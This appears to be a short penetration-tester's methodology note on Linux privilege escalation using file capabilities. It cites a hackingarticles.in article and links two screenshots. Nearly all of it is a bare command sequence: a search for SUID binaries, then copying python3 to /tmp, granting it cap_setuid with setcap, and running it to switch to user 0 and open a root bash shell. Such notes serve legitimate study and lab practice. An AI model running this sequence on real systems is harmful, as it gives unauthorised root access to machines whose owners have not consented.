<https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/>

find / -type f -perm -04000 -ls 2>/dev/null

cd /tmp
whereis python3
cp /usr/bin/python3 .
setcap cap_setuid+ep python3
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

![unnamed_7a5fba37e10e4c02b6fde82c4010c415](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Linux%20Privesc/Methodology/Attacks/SUID%20binaries/setcap/{{notename}}-202605011506.png)
![unnamed_cf56857d087643e4b13dfed60db34d8c](docs/Attachments/Methodology/2.%20Privilege%20Escalation/Linux%20Privesc/Methodology/Attacks/SUID%20binaries/setcap/{{notename}}-202605011506-1.png)
